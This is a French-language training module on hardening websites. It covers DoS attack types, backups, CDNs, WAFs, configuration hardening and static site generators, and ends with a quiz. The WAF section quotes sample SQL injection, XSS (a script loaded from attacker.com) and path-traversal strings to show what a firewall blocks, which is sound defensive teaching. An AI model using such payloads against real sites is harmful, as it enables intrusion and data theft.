+++
style = "module"
weight = 1
title = "Renforcement du site Web"
description = "Nous explorons quelques premières étapes que vous pouvez suivre pour rendre votre site web plus résilient aux attaques."
+++

## Cas d'utilisation

Il existe un certain nombre de mesures qui peuvent être prises sur un site Web dans son ensemble pour le rendre plus résilient face aux attaques. Celles-ci nécessitent généralement moins d'efforts que de parcourir le site page par page et peuvent avoir un impact important, c'est donc généralement une bonne idée de passer par ces actions en premier.

## Objectifs

Après avoir terminé ce sous-thème, les participants devraient être en mesure de faire ce qui suit :

- Utiliser des processus de développement et de maintenance qui garantissent que le site peut être recréé si les serveurs d'hébergement de production deviennent indisponibles.
- Utiliser des CDN (réseaux de diffusion de contenu) pour protéger le site Web contre les attaques DoS
- Utiliser des générateurs de sites statiques pour rendre le site plus résilient face aux attaques DoS et au piratage
- Utiliser des durcisseurs de configuration et des WAF pour rendre le site plus résilient face au piratage

---
## Section Principale

Cette sous-compétence couvre les activités fondamentales à l'échelle du site qui doivent être effectuées sur presque tous les sites qui souhaitent être protégés contre les attaques. Bien que chaque action puisse ne pas s'appliquer à chaque site, certaines s'appliquent à tous les sites, et toutes s'appliquent à certains sites.

### Fonctionnement des attaques DoS sur les sites Web

L'un des thèmes principaux de ce parcours d'apprentissage concerne les attaques DoS. Afin de comprendre comment se défendre et répondre à ces attaques, nous devons comprendre comment elles fonctionnent.

#### Types d'attaques

Les attaques DoS peuvent être largement décomposées en fonction de la couche de l'application qui empile les cibles d'attaque, et si l'attaque est volumétrique ou si elle exploite des bugs dans le logiciel cible.

##### Attaques au niveau du réseau

Le type d'attaque DoS de niveau le plus bas fonctionne au niveau du réseau. La cible de ces attaques est les connexions réseau entre les ordinateurs, l'équipement de routage et/ou le système d'exploitation sur la cible. Dans une attaque volumétrique, le cybercriminel enverra simplement des tonnes de trafic réseau à la cible, en essayant de submerger le réseau ou la capacité de commutation/routage des périphériques réseau connectant la cible à Internet. Les exemples de ce type d'attaque comprennent les [ping floods](https://en.wikipedia.org/wiki/Ping_flood), les [attaques par rebond](https://en.wikipedia.org/wiki/Smurf_attack) et les [attaques d'amplification NTP](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/).

De temps en temps, un bug est trouvé dans un périphérique réseau ou un système d'exploitation de serveur qui permet des attaques DoS plus efficaces. Celles-ci vont du « [ping de la mort](https://en.wikipedia.org/wiki/Ping_of_death) » classique des années 1990, où un seul paquet pouvait provoquer un crash du serveur, aux [problèmes de collision de hachage](https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html) plus modernes.

##### Attaques au niveau du protocole

Ces attaques se trouvent un cran au-dessus dans la pile réseau. Pour les sites Web, ces attaques utiliseront toutes le protocole HTTP pour tenter de submerger le serveur Web ou son infrastructure backend. Les attaques volumétriques sont similaires aux attaques au niveau du réseau : les cybercriminels ne font que provoquer un flux de trafic important.

Il existe également des attaques DoS basées sur des exploitations de failles au niveau du protocole, ciblant généralement le logiciel du serveur Web. L'attaque [HTTP POST lente](https://www.educative.io/answers/what-is-slow-http-post-dos-attack) en est un exemple.

##### Attaques au niveau de l'application

La dernière classe d'attaques DoS est celle qui cible une fonctionnalité coûteuse en ressources du site Web cible lui-même. Comme il est spécifique au site cible, ce type d'attaque nécessite plus de compétences techniques que les autres types, mais peut être extrêmement efficace et difficile à arrêter. Dans ces attaques, l'auteur de la menace identifiera une fonction du site Web qui nécessite beaucoup de ressources du côté serveur. Les exemples peuvent inclure une page qui redimensionne une image (peut solliciter beaucoup de mémoire au niveau du serveur), qui envoie des e-mails (peut consommer des ressources réseau disproportionnées et affecter la réputation du serveur de messagerie), qui effectue une recherche compliquée (peut consommer beaucoup de ressources CPU pour la base de données et le cache), etc.

Ces attaques servent généralement à réduire considérablement le coût d'une attaque DoS pour le cybercriminel. Au lieu d'envoyer des dizaines ou des centaines de milliers de requêtes par seconde, le cybercriminel peut être en mesure de rendre un serveur Web non réactif avec seulement une centaine de requêtes par seconde. Non seulement cela réduit le coût du cybercriminel en termes de requêtes envoyées, le cybercriminel peut cacher son trafic plus facilement, car le volume de trafic global peut ne pas être important. En outre, l'arrêt de ces attaques nécessite généralement des modifications du site lui-même, qui dans certains cas peuvent être assez étendues.

#### DoS et DDoS

Une attaque DDoS (déni de service distribué) est un type d'attaque DoS où le trafic malveillant provient d'un grand nombre de sources. Ceci est contraire à une attaque conventionnelle, où un petit nombre d'ordinateurs envoient le trafic malveillant. Lorsque les défenseurs ont acquis des compétences et des capacités, les attaques efficaces sont généralement des attaques DDoS, car les attaques conventionnelles sont faciles à bloquer et ne génèrent souvent pas suffisamment de trafic. La plupart des attaques DDoS impliquent des cybercriminels louant du temps sur un [botnet](https://en.wikipedia.org/wiki/Botnet) existant ou embauchant un [service dédié DDoS-for-hire](https://krebsonsecurity.com/category/ddos-for-hire/), bien que certains groupes d'extorsion aient leurs propres botnets.

### Pratiques de développement et de maintenance des sites

La chose la plus fondamentale pour contribuer à se préparer et à répondre aux attaques consiste à pouvoir reconstruire le site à partir de zéro. Cela s'avère important dans les attaques DoS, car le site peut non seulement être indisponible pour les utilisateurs finaux, mais aussi pour les propriétaires de sites. Dans certains cas, les fournisseurs d'hébergement supprimeront un site qui est attaqué, afin d'éviter que leurs systèmes ne soient surchargés. Dans une attaque de piratage, il est souvent essentiel d'avoir une copie « propre » du site pour l'investigation et pour le nettoyage après l'attaque.

#### Contrôle des versions

Le code du site et le contenu statique doivent être stockés dans un système de contrôle de version basé sur le serveur. Les développeurs de sites sont souvent eux-mêmes des cibles d'attaques. Par exemple, un [propriétaire de site azerbaïdjanais a été victime d'une attaque d'hameçonnage et le cybercriminel a utilisé son accès pour placer une porte dérobée sur le site Web de la victime](https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/). Avoir un système de contrôle de version, en particulier un système géré en externe, peut limiter l'impact d'une compromission d'un responsable de site. De plus, avoir du code et du contenu stockés à distance présente d'autres avantages en cas d'incident, comme la perte d'un ordinateur portable. Les services tels que [GitHub](https://docs.github.com/en) et [GitLab](https://about.gitlab.com/resources/) ont des niveaux gratuits qui répondent aux besoins des individus et des petites organisations.

#### Configuration du développement répliqué

Dans la mesure du possible, les responsables de site doivent disposer d'un environnement isolé et contrôlé où ils peuvent apporter et tester des modifications à leur site Web. Cela peut être aussi simple qu'un site non publié et protégé par mot de passe chez un fournisseur comme Wordpress.com ou Wix, ou une configuration Docker multi-conteneurs complète qui permet à un développeur d'avoir un environnement complet sur son ordinateur portable. Quoi qu'il en soit, il peut être difficile ou impossible d'apporter des modifications à la production pendant une attaque, et il est très facile de faire des erreurs dans une situation de stress élevé. Disposer d'un environnement de développement distinct permettra aux responsables de site d'effectuer et de tester les modifications dans un endroit sûr avant de déployer ces modifications en production.

#### Sauvegardes des bases de données

Si le site Web dispose d'une base de données, il est important que cette base de données soit sauvegardée et que ces sauvegardes soient testées. Idéalement, les sauvegardes doivent être effectuées automatiquement et les anciennes sauvegardes stockées. De cette façon, si un cybercriminel parvient à utiliser une vulnérabilité comme l'injection SQL pour corrompre la base de données, une version propre peut être restaurée, même si l'attaque n'est pas détectée immédiatement. Si la base de données est petite, elle peut être stockée dans le système de contrôle de version du site. Les sauvegardes plus importantes peuvent être stockées en toute sécurité et à moindre coût dans des systèmes tels qu'[AWS S3](https://aws.amazon.com/s3/) ou [le stockage cloud de GCP](https://cloud.google.com/storage?hl=en#backups-and-archives). Le contrôle d'accès doit bien sûr être activé sur le système de stockage. Idéalement, les processus qui sauvegardent les données ne devraient avoir que des autorisations pour ajouter de nouveaux fichiers au stockage, et non pour lire, écrire ou supprimer des données existantes.

### Utilisation de CDN ou d'hébergement résistants aux attaques DoS

Étant donné que les attaques par déni de service sont la menace la plus courante pour les sites Web de la société civile, la prochaine priorité du propriétaire de site devrait être de mettre en place des défenses de base contre les attaques DoS. Il y a deux façons de le faire : utiliser un CDN avec une protection DoS ou utiliser un hébergeur résistant aux attaques DoS.

#### CDN résistants aux attaques DoS

À l'origine, les CDN (réseaux de diffusion de contenu) servaient à fournir des ressources Web statiques plus rapidement et à moindre coût. Ils étaient généralement utilisés par les sites Web à trafic important. Habituellement, le propriétaire du site Web utilisera un nom d'hôte spécial (p. ex., images.exemple.com) et donnera le contrôle DNS de ce nom d'hôte au fournisseur de CDN. Le fournisseur de CDN dispose d'un vaste réseau de serveurs Web, idéalement placés à proximité (en termes de topologie de réseau) des utilisateurs finaux. Ces serveurs sont appelés serveurs « de périphérie ». Lorsqu'un utilisateur final effectue une recherche DNS pour ce nom d'hôte, les serveurs du fournisseur de CDN répondent avec l'adresse IP du serveur de périphérie CDN « le plus proche ». Lorsque l'utilisateur final demande une ressource (page Web, image, fichier son, etc.) au serveur de périphérie, celui-ci vérifie d'abord s'il dispose de la ressource dans son cache. Sinon, il demande la ressource à partir du site Web d'origine (appelé serveur « d'origine ») et la stocke dans son cache. Une fois que la ressource est en cache, le serveur peut la restituer à l'utilisateur final. En cas de demande ultérieure, il répondra immédiatement avec la ressource mise en cache. Sur un site Web à forte utilisation, cela réduit la charge sur le serveur d'origine et permet également de réduire la latence réseau.

Au fil du temps, l'utilité des CDN pour la protection DoS est devenue évidente. Les CDN ont une grande capacité de bande passante et un logiciel de serveur Web spécialisé, ce qui permet d'éviter les attaques DoS. Cela arrête les attaques au niveau du réseau et la plupart des attaques au niveau du protocole contre le contenu Web statique. Pour la protection contre les attaques de niveau protocole contre n'importe quelle page, les sites Web serviront tout le contenu par l'intermédiaire du CDN, par opposition au contenu statique. Étant donné que les CDN offrent une protection à plusieurs clients, ils peuvent développer des outils, des techniques et une expertise spécialisés dans la détection et le blocage des attaques DoS.

Les outils [Deflect](https://deflect.ca/non-profits/), [Project Shield](https://projectshield.withgoogle.com/landing), [Fastly](https://www.fastly.com/fast-forward) et [CloudFlare](https://www.cloudflare.com/galileo/) sont des exemples de solutions CDN résistantes au déni de service.

À titre de mise en garde importante sur l'utilisation d'un CDN pour protéger votre site Web contre les attaques DoS, notons qu'il est impératif que vous restreigniez le trafic vers vos serveurs Web d'origine. Supposons que votre site Web, servi par un CDN, utilise le nom d'hôte [www.exemple.com](http://www.example.com) et que vous utilisez origine.exemple.com pour votre serveur Web d'origine « réel ». Si un cybercriminel lance une attaque DoS contre origine.exemple.com, il contournera complètement le CDN et votre site ne recevra aucun avantage. Au lieu de cela, les serveurs Web d'origine devraient avoir des restrictions d'adresse IP en place au niveau du réseau (par exemple via un pare-feu), ou idéalement être complètement coupés d'Internet et accessibles uniquement via un VPN.

En outre, certaines erreurs de configuration peuvent empêcher un serveur CDN de périphérie de reconnaître le contenu statique par rapport au contenu dynamique. Par exemple, si un site Web a une page Web comme [www.exemple.com/profil](http://www.example.com/profile), le CDN ne sait pas automatiquement que la page contient des informations privées. La façon la plus normalisée de contourner ce problème consiste à configurer le CDN pour qu'il soit mis en cache en fonction des en-têtes de réponse, puis de définir un en-tête `Cache-Control` dont la valeur est `privée` ou similaire. Cela indiquera au CDN que la page contient des informations privées, et de ne pas donner le même contenu à différents utilisateurs. Les spécificités de la configuration et de l'utilisation varient selon les fournisseurs de CDN, assurez-vous donc de consulter la documentation de votre fournisseur avant de configurer le CDN. Il est également judicieux d'avoir un site de prédiffusion qui est configuré avec les mêmes CDN et paramètres que le site de production. De cette façon, les gestionnaires du site peuvent vérifier les modifications majeures avant de les mettre en ligne.

#### Hébergement résistant aux attaques DoS

Certains fournisseurs combinent l'hébergement Web avec la résistance DoS. En général, ils ont le même type de technologies et de pratiques que les fournisseurs de CDN, mais celles-ci sont regroupées avec l'hébergement Web. Cela permet d'éviter le problème ci-dessus de protéger les serveurs d'origine, mais dépend du fournisseur fournissant à la fois la protection et les services d'hébergement dont vous avez besoin. [Qurium](https://www.qurium.org/secure-hosting/) et [Greenhost](https://greenhost.net/internet-freedom/) sont des exemples de fournisseurs d'hébergement résistants aux attaques DoS.

#### Limitations des fournisseurs de CDN et d'hébergement résistants aux attaques DoS

Vous avez peut-être remarqué que la protection fournie par les fournisseurs de CDN et d'hébergement résistants aux attaques DoS couvre la majorité des attaques, mais le contenu ci-dessus a omis les attaques au niveau de l'application. Il peut y avoir des failles dans un site Web qui permettent des attaques DoS avec des volumes très faibles. Les défenses habituelles contre les attaques DoS ne sont pas efficaces dans ce cas. Cela dit, le personnel d'assistance et d'intervention rapide des fournisseurs de CDN et d'hébergement peut être en mesure d'aider les propriétaires de sites Web en cas d'attaque DoS active au niveau de l'application contre leur site Web.

La défense contre les attaques au niveau de l'application est abordée plus en détail dans le sous-thème Réponse aux incidents DoS (sous-thème 3 dans ce parcours d'apprentissage).

### Utilisation des pare-feux des applications Web

Les AWF (Web Application Firewalls) sont des dispositifs réseau qui se trouvent entre un utilisateur final et le serveur d'origine d'un site Web, comme un CDN. Alors que les CDN fournissent une protection contre les attaques DoS, les AWF tentent de se protéger contre les attaques de piratage. Ils inspecteront les requêtes entrantes et bloqueront celles qui semblent malveillantes, par exemple les paramètres contenant des éléments tels que `' or 1=1;--` (injection SQL), `">&lt;script src="http://attacker.com/payload.js">&lt;z a="` (XSS) ou `../../../../../../etc/passwd` (traversée de répertoires). Bien qu'aucun WAF ne puisse fournir une protection parfaite contre le piratage, il peut être suffisamment efficace pour protéger un site contre les compromissions et compliquer presque toujours l'identification des vulnérabilités par le cybercriminel. Dans la plupart des cas, un bon WAF ne perturbera pas le contenu légitime, mais il est possible que cela se produise. Par exemple, si un site comprend un forum de discussion sur le développement Web sécurisé, un WAF bloquerait probablement les messages légitimes concernant les techniques d'attaque. Comme pour les CDN, il peut être très judicieux d'avoir un site de prédiffusion sur lequel les modifications peuvent être testées avant leur mise en ligne.

La plupart des CDN résistants aux attaques DoS ont également des fonctions WAF. Il existe également des fournisseurs WAF dédiés qui fournissent des services supplémentaires, y compris généralement une protection contre les attaques DoS. Par exemple, [Sucuri](https://sucuri.net/website-firewall/) est un fournisseur WAF qui fournit également une protection DoS, et certaines capacités de sauvegarde et de réponse aux incidents. [WordFence](https://www.wordfence.com/products/pricing/) est un fournisseur WAF spécialisé dans la protection des sites construits sur WordPress. En plus de tenter de bloquer les tentatives de piratage générique et les attaques DoS, il tente de bloquer les attaques qui ciblent spécifiquement les sites WordPress.

Il existe également des WAF qui sont censés être exécutés sur le même serveur ou le réseau que le site Web qu'ils protègent. Les exemples incluent des produits coûteux par Barracuda et F5, ainsi que des solutions open source telles que [ModSecurity](https://github.com/SpiderLabs/ModSecurity). Notez que ces systèmes ne fournissent généralement pas de protection DoS par eux-mêmes.

### Renforcement de la configuration

Les sites Web sont presque universellement construits sur une sorte de cadre qui gère la plupart du travail visant à servir des pages Web. Il peut s'agir d'un framework de bas niveau, comme nginx, qui ne gère que le réseau et le protocole HTTP de base, ou d'un framework de très haut niveau comme WordPress, qui gère tout sauf le contenu du site. Dans la grande majorité des cas, le framework fournit une suite de fonctionnalités, de capacités et d'autres options de configuration, dont la plupart ne sont pas nécessaires pour le site Web. Ces fonctionnalités et configurations inutiles exposent le site Web à des risques supplémentaires en augmentant la surface d'attaque (et le potentiel de bugs exposés) ou les configurations non sécurisées elles-mêmes.

Bien qu'il soit possible d'étudier manuellement les capacités d'un framework et de décider comment activer les fonctionnalités et les configurations par soi-même, il est généralement beaucoup plus facile et efficace d'utiliser un outil ou un ensemble de directives par défaut. Ces renforcements de la configuration représentent généralement des milliers d'heures de travail pour verrouiller un système autant que possible sans le rendre inutilisable.

Comme pour toute modification du système, il est utile, et peut-être nécessaire, d'avoir un environnement séparé dans lequel tester les modifications, ainsi qu'un processus de test pour garantir que tout fonctionne correctement avant de déployer les modifications en production. Un site peut dépendre d'une configuration non sécurisée ou d'une fonctionnalité peu utilisée pour fonctionner correctement. Dans ce cas, il est préférable de résoudre la situation avant de mettre en service le site reconfiguré.

Le [DevSec Hardening Framework](https://dev-sec.io/baselines/) fournit un ensemble de bases de sécurité pour renforcer une grande variété de logiciels d'infrastructure couramment utilisés, tels que Linux, MySQL, Apache, Docker, etc. Ces références sont documentées sur le site Web et fournissent des recettes pour les gestionnaires de configuration tels que Chef, Puppet et Ansible.

D'autres renforcements de la configuration vont beaucoup plus loin dans les frameworks qu'ils sécurisent. Un exemple est [Snuffleupagus](https://snuffleupagus.readthedocs.io/), qui sécurise les installations PHP. En plus de fournir des modifications de la configuration, il modifie le comportement des fonctions pour les rendre moins dangereuses. Par exemple, il modifie la fonction `system()` pour supprimer les caractères potentiellement dangereux de son entrée, et la fonction `mail()` pour interdire les fonctionnalités qui peuvent être utilisées pour écrire des fichiers arbitraires.

Bien que les renforcements de la configuration ne puissent pas éliminer toutes les vulnérabilités d'un site Web et que leur utilisation nécessite des tests minutieux du site par la suite, ils constituent l'un des moyens les plus faciles de fermer ou de ralentir l'exploitation d'un site.

### Générateurs de sites statiques

De nombreux sites Web utilisent un système de gestion de contenu pour gérer le site, même si le contenu du site ne change pas pour chaque visiteur. Bien qu'il y ait certainement des sites qui doivent être mis à jour plusieurs fois par minute, ou personnaliser le contenu pour chaque visiteur, la plupart sont essentiellement des sites statiques. Dans ce cas, « statique » signifie généralement une mise à jour toutes les quelques heures ou moins. Pour plus de commodité, la plupart de ces sites sont générés dynamiquement à chaque visite. Dans le cadre d'une utilisation normale, cela ne pose aucun problème. Cependant, dans le cas d'un site qui est ciblé, certaines complications apparaissent.

Tout d'abord, ce comportement dynamique expose plus de surface d'attaque aux cybercriminels. Au lieu de se limiter à un serveur Web et quelques fichiers, le site devient un ensemble compliqué de comportements dynamiques sauvegardés par une combinaison de fichiers et de bases de données. Celle-ci est beaucoup plus susceptible de contenir une vulnérabilité qui pourrait être exploitée par un cybercriminel.

Deuxièmement, cet assemblage complexe de bases de données et de scripts prend beaucoup plus de temps à générer une réponse HTTP qu'un site statique. Cette complexité de traitement supplémentaire rend les attaques par déni de service beaucoup plus efficaces.

En bref, si un site Web peut fonctionner comme un site statique, il sera beaucoup plus résilient en tant que site statique qu'en tant que site dynamique. Il élargit également les options d'hébergement du site et réduit les coûts d'hébergement, car le site peut être servi avec des outils comme des compartiments de stockage de fournisseurs de cloud, des pages GitHub, etc.

Certains générateurs de sites statiques ont leur propre structure simple pour le contenu du site et s'appuient généralement sur des fichiers Markdown, certains modèles de style HTML et certains fichiers de configuration. Cependant, de nombreux systèmes de gestion de contenu utiliseront un générateur de site statique sur le backend pour produire le site Web final. Bien sûr, il est également possible de simplement maintenir les fichiers source dans git ou une solution similaire. Dans tous les cas, les propriétaires du site apporteront des modifications à la configuration du site Web, puis généreront, testeront et téléchargeront le site statique complet pour chaque modification. Les exemples de certains générateurs de sites statiques autonomes populaires comprennent [Hugo](https://gohugo.io/) et [Jekyll](https://jekyllrb.com/). Pour la gestion de contenu, nous pouvons mentionner les CMS qui utilisent des générateurs de sites statiques comme [Cloud Cannon](https://cloudcannon.com/jamstack-ecosystem/static-site-generators/) ou [Static CMS](https://www.staticcms.org/docs/add-to-your-site).

L'inconvénient de la migration vers un générateur de site Web statique comme Hugo ou Jekyll est que vous devez migrer votre contenu existant. Pour les sites Web utilisant un CMS différent, cela peut représenter beaucoup de travail. Il est toutefois possible d'utiliser un générateur de site statique pour votre plateforme existante. Nous pouvons citer comme exemple populaire [WP2Static](https://wp2static.com/), une extension WordPress [open source](https://github.com/elementor/wp2static) qui transformera un site WordPress en un site statique. Une migration peut encore être nécessaire, les [formulaires de contact](https://wp2static.com/docs/basics/contact-forms-for-static-sites/) devront être modifiés et devront être migrés vers un service tiers comme [Disqus](https://help.disqus.com/en/articles/1717131-importing-comments-from-wordpress), [ReplyBox](https://getreplybox.com/docs/importing-wordpress-comments/) ou bien d'autres. Notez que l'utilisation d'un service de commentaires tiers donnera le contrôle des commentaires des utilisateurs de votre site à une tierce partie.

## Contrôle de compétence

Le renforcement des sites Web joue un rôle essentiel dans la protection des actifs en ligne contre diverses cybermenaces. Cet ensemble de questions difficiles à choix multiples explore les concepts de base du renforcement des sites Web, en se concentrant sur les stratégies et les technologies clés visant à améliorer la résilience des applications Web contre les vulnérabilités communes. Des processus de développement et de maintenance assurant la disponibilité du site à la mise en œuvre de réseaux de diffusion de contenu (CDN) et de générateurs de sites statiques, ces questions explorent les subtilités du renforcement des sites Web contre les tentatives de piratage.

Testez vos connaissances sur les pratiques de renforcement des sites Web et découvrez les mesures essentielles pour renforcer la posture de sécurité de vos plateformes en ligne. Si possible, discutez de vos réponses à ces questions avec un pair ou un mentor qui vous aidera à vérifier que vous avez bien compris le sujet.

1. Quel processus de développement et de maintenance permet de recréer un site Web si les serveurs d'hébergement de production ne sont pas disponibles ?

A) Mettre à jour régulièrement les extensions et les thèmes du site Web\
B) Mettre en œuvre l'authentification multifactorielle pour les comptes d'administrateur\
C) Utiliser des systèmes de contrôle de version et de sauvegardes automatisées\
D) Appliquer des politiques de mot de passe strictes pour les comptes d'utilisateur\

{{< question title="Bonne réponse et explication :" >}}
Bonne réponse : C) Utiliser des systèmes de contrôle de version et de sauvegardes automatisées

Explication : l'utilisation de systèmes de contrôle de version (tels que Git) et de sauvegardes automatisées garantit que la base de code et les données du site Web sont stockées en toute sécurité et peuvent être facilement restaurées en cas de défaillance du serveur ou de perte de données. Cette pratique contribue à maintenir l'intégrité du site Web et minimise les temps d'arrêt.
{{< /question >}}

2. Comment un CDN (Content Delivery Network) peut-il aider à protéger un site Web contre les attaques par déni de service (DoS) ?

A) En distribuant le contenu du site Web sur plusieurs serveurs pour gérer les pics de trafic\
B) En chiffrant toutes les données transmises entre le serveur et le client\
C) En fournissant des couches supplémentaires d'authentification pour les connexions des utilisateurs\
D) En bloquant automatiquement l'accès aux adresses IP suspectes

{{< question title="Bonne réponse et explication :" >}}
Bonne réponse : A) En distribuant le contenu du site Web sur plusieurs serveurs pour gérer les pics de trafic

Explication : un CDN (Content Delivery Network) contribue à protéger un site Web contre les attaques DoS en distribuant son contenu sur plusieurs serveurs situés dans divers emplacements géographiques. Cette distribution permet de répartir la charge de trafic entrant, de réduire l'impact des attaques DoS et de garantir que le site Web reste accessible aux utilisateurs même pendant les périodes de trafic élevé.
{{< /question >}}


3. Quelle technologie peut améliorer la résistance d'un site Web aux attaques de déni de service (DoS) et de piratage en fournissant des pages HTML prérendues aux utilisateurs ?

A) Les plateformes informatiques sans serveur\
B) Les frameworks d'applications Web dynamiques\
C) Les systèmes de gestion de contenu (CMS)\
D) Les générateurs de sites statiques

{{< question title="Bonne réponse et explication :" >}}
Bonne réponse : D) Les générateurs de sites statiques

Explication : les générateurs de sites statiques créent des sites Web en générant des pages HTML à partir de fichiers sources pendant le processus de création. Étant donné que les sites statiques ne reposent pas sur un traitement côté serveur ou sur des bases de données, ils sont intrinsèquement plus résistants au piratage et aux attaques DoS. Les sites statiques sont également généralement plus rapides à charger et plus faciles à mettre en cache, ce qui améliore encore leur résilience aux attaques.
{{< /question >}}

4. Comment les renforcements de configuration et les WAF (Web Application Firewalls) contribuent-ils à rendre un site Web plus résilient face au piratage ?

A) En optimisant les performances du serveur et l'utilisation des ressources\
B) En mettant en œuvre des couches supplémentaires d'authentification pour les connexions des utilisateurs\
C) En détectant et en bloquant automatiquement les schémas d'attaque connus et le trafic suspect\
D) En chiffrant toutes les données transmises entre le serveur et le client

{{< question title="Bonne réponse et explication :" >}}
Bonne réponse : C) En détectant et en bloquant automatiquement les schémas d'attaque connus et le trafic suspect

Explication : les renforcements de configuration et les WAF (Web Application Firewalls) contribuent à rendre un site Web plus résistant au piratage en détectant et en bloquant automatiquement les schémas d'attaque connus et le trafic suspect. Ces mesures de sécurité agissent comme une barrière entre le site Web et les cybercriminels potentiels, en filtrant les requêtes et le trafic entrants pour empêcher les activités malveillantes et les accès non autorisés
{{< /question >}}


## Ressources d'apprentissage

{{% resource title="Ping flood" description="Une description d'une attaque courante par déni de service" languages="anglais, chinois, japonais, russe, ukrainien, grec, indonésien, catalan, espagnol, français, italien, néerlandais, polonais, portugais, turc, tchèque" cost="Gratuit" url="https://fr.wikipedia.org/wiki/Ping_flood" %}}
{{% resource title="Attaque par rebond" description="Une description d'une autre attaque par déni de service courante, comprenant des exemples et des mesures d'atténuation" languages="anglais, arabe, farsi, japonais, coréen, grec, indonésien, catalan, allemand, espagnol, basque, français, italien, lombard, néerlandais, polonais, portugais, slovène, finnois, tchèque" cost="Gratuit" url="https://fr.wikipedia.org/wiki/Attaque_par_rebond" %}}
{{% resource title="Attaque d'amplification NTP" description="Un aperçu de la façon dont le protocole de temps réseau (NTP) pourrait être utilisé à mauvais escient pour les attaques par déni de service" languages="anglais, allemand, espagnol, français, italien, japonais, coréen, portugais, chinois, taïwanais" cost="Gratuit" url="https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/" %}}
{{% resource title="Ping de la mort" description="Une attaque dans laquelle un ordinateur est submergé par un ping malveillant" languages="anglais, arabe, farsi, chinois, japonais, coréen, bulgare, russe, ukrainien, grec, azéri, indonésien, allemand, espagnol, français, italien, néerlandais, polonais, portugais, roumain, tchèque, hébreu" cost="Gratuit" url="https://fr.wikipedia.org/wiki/Ping_de_la_mort" %}}
{{% resource title="Les attaques de complexité algorithmique et le code réseau Linux" description="Un regard sur la façon dont Linux gère la mise en réseau et une attaque spécifique qui pourrait être dirigée contre elle" languages="Anglais" cost="Gratuit" url="https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html" %}}
{{% resource title="Qu'est-ce qu'une attaque DOS HTTP post lente ?" description="Un aperçu d'une attaque par déni de service qui exploite certaines fonctionnalités des requêtes HTTP POST (les requêtes sont envoyées assez lentement pour que le serveur les traite, mais pas assez lentement pour déclencher des délais d'attente)" languages="Anglais" cost="Gratuit" url="https://www.educative.io/answers/what-is-slow-http-post-dos-attack" %}}
{{% resource title="Botnet" description="Un aperçu de ce qu'est un botnet, ou un groupe d'appareils connectés à Internet gérés automatiquement utilisés à des fins malveillantes" languages="48 langues" cost="Gratuit" url="https://fr.wikipedia.org/wiki/Botnet" %}}
{{% resource title="DDoS for hire" description="Une collection d'articles de blog de Brian Krebs sur le secteur DDoS for hire" languages="Anglais" cost="Gratuit" url="https://krebsonsecurity.com/category/ddos-for-hire/" %}}
{{% resource title="Les attaques d'hameçonnage sophistiquées ciblées contre les dissidents en Azerbaïdjan deviennent courantes" description="Un rapport Qurium de 2020 sur un cybercriminel qui s'est introduit sur un site Web pour en utiliser les données et hameçonner des dissidents" languages="Anglais" cost="Gratuit" url="https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/" %}}
{{% resource title="Deflect pour les organismes sans but lucratif" description="Deflect est un programme de protection DDoS qui permet aux associations de s'inscrire gratuitement" languages="Anglais" cost="Gratuit" url="https://deflect.ca/non-profits/" %}}
{{% resource title="Google Project Shield" description="Un service de protection DDoS gratuit pour les actualités, les droits humains et les sites liés aux élections" languages="Anglais" cost="Gratuit" url="https://projectshield.withgoogle.com/landing" %}}
{{% resource title="Projet Galileo de Cloudflare" description="La protection pré-DDoS et autres mesures de sécurité pour les sites à risque, y compris les groupes artistiques, les organisations humanitaires et les dissidents politiques" languages="anglais, allemand, espagnol, français, italien, japonais, coréen, portugais, chinois, taïwanais" cost="Gratuit" url="https://www.cloudflare.com/galileo/" %}}
{{% resource title="Hébergement sécurisé pour les sites à risque" description="Qurium et Greenhost proposent tous deux des services d'hébergement pour les groupes qui pourraient être à risque de subir des attaques en raison de leur travail en matière de droits humains et d'information." languages="Anglais" cost="Varié, selon le forfait d'hébergement" url="Qurium : https://www.qurium.org/secure-hosting/ <br> Greenhost : https://greenhost.net/internet-freedom/" %}}
{{% resource title="Pare-feux d'applications Web" description="Des périphériques réseau situés entre un utilisateur final et le serveur d'origine d'un site Web, comme un CDN, offrant une couche de sécurité supplémentaire" languages="Anglais" cost="Varié" url="Sucuri : https://sucuri.net/website-firewall/ <br> Wordfence : https://www.wordfence.com/products/pricing/ <br> ModSecurity : https://github.com/SpiderLabs/ModSecurity" %}}
{{% resource title="Renforcements des applications Web" description="Outils automatisés qui détectent les vulnérabilités potentielles dans les applications Web" languages="Anglais" cost="Varié, de nombreuses options gratuites" url="Un cadre de renforcement : https://dev-sec.io/baselines/ <br> Snuffleupagus : https://snuffleupagus.readthedocs.io/" %}}
{{% resource title="Générateurs de sites statiques" description="Un aperçu des principaux générateurs de sites statiques" languages="Anglais" cost="Gratuit" url="https://cloudcannon.com/jamstack-ecosystem/static-site-generators/" %}}
{{% resource title="WP2Static" description="Une extension WordPress pour générer des sites statiques" languages="Anglais" cost="Gratuit" url="https://wp2static.com/" %}}